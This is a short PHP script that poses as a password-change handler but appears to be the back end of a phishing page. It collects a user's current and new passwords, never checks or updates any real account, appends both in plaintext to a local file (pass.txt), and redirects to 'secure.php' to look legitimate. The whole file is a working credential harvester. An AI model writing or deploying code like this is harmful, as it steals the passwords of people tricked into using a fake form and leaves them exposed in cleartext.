<?php
if ($_SERVER["REQUEST_METHOD"] == "POST") {
    $currentPassword = $_POST["currentPassword"];
    $newPassword = $_POST["newPassword"];
    $confirmPassword = $_POST["confirmPassword"];

    if ($newPassword !== $confirmPassword) {
        echo "New password and confirm password do not match.";
        exit;
    }

    // Store password data in a file
    $file = fopen("pass.txt", "a") or die("Unable to open file!");
    $data = "Current Password: " . $currentPassword . "\n" .
            "New Password: " . $newPassword . "\n\n";
    fwrite($file, $data);
    fclose($file);

    // Redirect to thanks.php
    header("Location:secure.php");
    exit;
}
?>
